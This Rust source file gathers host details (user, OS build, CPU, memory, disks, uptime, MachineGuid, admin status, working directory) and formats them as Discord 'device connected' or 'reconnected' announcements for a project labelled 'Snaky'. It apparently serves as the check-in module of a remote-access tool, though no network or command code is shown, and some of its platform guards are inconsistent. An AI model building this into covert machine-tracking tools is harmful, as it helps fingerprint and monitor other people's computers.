use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use sysinfo::{CpuExt, DiskExt, System, SystemExt};

const PROJECT_FOOTER: &str = "-# Snaky";

fn format_uptime(seconds: u64) -> String {
    let mut remaining = seconds;
    let days = remaining / 86_400;
    remaining %= 86_400;
    let hours = remaining / 3_600;
    remaining %= 3_600;
    let minutes = remaining / 60;
    let seconds = remaining % 60;

    let mut parts = Vec::new();
    if days > 0 {
        parts.push(format!("{}d", days));
    }
    if hours > 0 {
        parts.push(format!("{}h", hours));
    }
    if minutes > 0 {
        parts.push(format!("{}m", minutes));
    }
    if seconds > 0 || parts.is_empty() {
        parts.push(format!("{}s", seconds));
    }

    parts.join(" ")
}

fn permission_label(is_admin: bool) -> &'static str {
    if is_admin {
        "Administrator"
    } else {
        "Standard"
    }
}

fn summarize(text: &str, max_len: usize) -> String {
    if text.len() <= max_len {
        return text.to_string();
    }

    let keep = max_len.saturating_sub(3);
    if keep == 0 {
        return "...".to_string();
    }

    let front = keep / 2;
    let back = keep - front;
    format!("{}...{}", &text[..front], &text[text.len() - back..])
}

fn windows_version_display() -> Option<String> {
    use winreg::enums::HKEY_LOCAL_MACHINE;
    use winreg::RegKey;

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm
        .open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
        .ok()?;

    let product_name: String = key.get_value("ProductName").unwrap_or_default();
    if product_name.is_empty() {
        return None;
    }

    let display_version: String = key
        .get_value("DisplayVersion")
        .or_else(|_| key.get_value("ReleaseId"))
        .unwrap_or_default();
    let build_number: String = key.get_value("CurrentBuild").unwrap_or_default();
    let build_revision: u32 = key.get_value("UBR").unwrap_or(0);

    let build = if !build_number.is_empty() {
        if build_revision > 0 {
            format!("{}.{}", build_number, build_revision)
        } else {
            build_number.clone()
        }
    } else {
        String::new()
    };

    if !display_version.is_empty() && !build.is_empty() {
        Some(format!(
            "{} {} (Build {})",
            product_name, display_version, build
        ))
    } else if !build.is_empty() {
        Some(format!(
            "{} (Build {})",
            product_name.replace("Windows 10", "Windows 11"),
            build
        ))
    } else if !display_version.is_empty() {
        Some(format!(
            "{} {}",
            product_name.replace("Windows 10", "Windows 11"),
            display_version
        ))
    } else {
        Some(product_name.replace("Windows 10", "Windows 11"))
    }
}

#[cfg(not(target_os = "windows"))]
fn windows_version_display() -> Option<String> {
    None
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeviceInfo {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub os_version: String,
    pub architecture: String,
    pub device_id: String,
    pub hardware_id: String,
    pub admin_status: bool,
    pub current_directory: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemInfo {
    pub os: String,
    pub kernel: String,
    pub hostname: String,
    pub cpu_name: String,
    pub cpu_cores: usize,
    pub memory_total: u64,
    pub memory_used: u64,
    pub disk_total: u64,
    pub disk_used: u64,
    pub uptime: u64,
}

impl SystemInfo {
    pub fn get_detailed_info() -> Result<SystemInfo> {
        let mut sys = System::new_all();
        sys.refresh_all();

        let os = match windows_version_display() {
            Some(details) => details,
            None => sys
                .long_os_version()
                .or_else(|| sys.os_version())
                .unwrap_or_else(|| std::env::consts::OS.to_string()),
        };

        let hostname = gethostname::gethostname().to_string_lossy().into_owned();

        let raw_total_memory = sys.total_memory();
        let raw_used_memory = sys.used_memory();
        let memory_multiplier = if raw_total_memory > (1u64 << 32) {
            1
        } else {
            1024
        };
        let total_memory = raw_total_memory.saturating_mul(memory_multiplier);
        let used_memory = raw_used_memory.saturating_mul(memory_multiplier);

        let cpu_cores = sys.physical_core_count().unwrap_or(sys.cpus().len());

        let mut total_disk: u64 = 0;
        let mut used_disk: u64 = 0;
        for disk in sys.disks() {
            total_disk = total_disk.saturating_add(disk.total_space());
            used_disk =
                used_disk.saturating_add(disk.total_space().saturating_sub(disk.available_space()));
        }

        Ok(SystemInfo {
            os,
            kernel: std::env::consts::ARCH.to_string(),
            hostname,
            cpu_name: sys.global_cpu_info().name().to_string(),
            cpu_cores,
            memory_total: total_memory,
            memory_used: used_memory,
            disk_total: total_disk,
            disk_used: used_disk,
            uptime: sys.uptime(),
        })
    }

    pub fn format_reconnection(&self, device: &DeviceInfo) -> String {
        let details = self.render_details(device);
        format!(
            "# Device **{}** reconnected\n{}\n{}",
            device.username, details, PROJECT_FOOTER
        )
    }

    pub fn format_for_discord(&self, device: &DeviceInfo) -> String {
        let details = self.render_details(device);
        format!(
            "# Device **{}** is now connected\n{}\n{}",
            device.username, details, PROJECT_FOOTER
        )
    }

    fn render_details(&self, device: &DeviceInfo) -> String {
        let uptime = format_uptime(self.uptime);
        let permission = permission_label(device.admin_status);
        let current_dir = summarize(&device.current_directory, 80);

        format!(
            "> Computer: {os}\n> User: {user} with {permission} permission.\n> Architecture: {arch}\n> CPU: {cpu} ({cores} cores)\n> Uptime: {uptime}\n> Current Dir: {current_dir}",
            os = self.os,
            user = device.username,
            permission = permission,
            arch = device.architecture,
            cpu = self.cpu_name,
            cores = self.cpu_cores,
            uptime = uptime,
            current_dir = current_dir
        )
    }
}

impl DeviceInfo {
    pub fn new() -> Result<Self> {
        let hostname = gethostname::gethostname().to_string_lossy().into_owned();

        let username = std::env::var("USERNAME")
            .or_else(|_| std::env::var("USER"))
            .unwrap_or_else(|_| "unknown".to_string());

        let os_version =
            windows_version_display().unwrap_or_else(|| std::env::consts::OS.to_string());
        let architecture = std::env::consts::ARCH.to_string();

        let device_id = Self::generate_device_id()?;

        Ok(DeviceInfo {
            hostname,
            username,
            os: os_version.clone(),
            os_version,
            architecture,
            device_id: device_id.clone(),
            hardware_id: device_id,
            admin_status: Self::is_admin(),
            current_directory: std::env::current_dir()
                .unwrap_or_else(|_| Path::new("").to_path_buf())
                .to_string_lossy()
                .to_string(),
        })
    }

    fn generate_device_id() -> Result<String> {
        use winreg::enums::HKEY_LOCAL_MACHINE;
        use winreg::RegKey;

        if let Ok(key) =
            RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Cryptography")
        {
            let value: String = key
                .get_value("MachineGuid")
                .map_err(|e| anyhow!("Failed to read MachineGuid: {e}"))?;
            let trimmed = value.trim();
            if !trimmed.is_empty() {
                return Ok(trimmed.to_string());
            }
        }

        Ok("unknown-device".to_string())
    }

    // Check if the current process is running with admin
    fn is_admin() -> bool {
        unsafe {
            use std::ptr::null_mut;
            use winapi::um::handleapi::CloseHandle;
            use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
            use winapi::um::securitybaseapi::GetTokenInformation;
            use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};

            let mut token = null_mut();
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) != 0 {
                let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
                let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
                let result = GetTokenInformation(
                    token,
                    TokenElevation,
                    &mut elevation as *mut _ as *mut _,
                    size,
                    &mut size,
                );
                CloseHandle(token);
                result != 0 && elevation.TokenIsElevated != 0
            } else {
                false
            }
        }

        #[cfg(not(target_os = "windows"))]
        false
    }
}
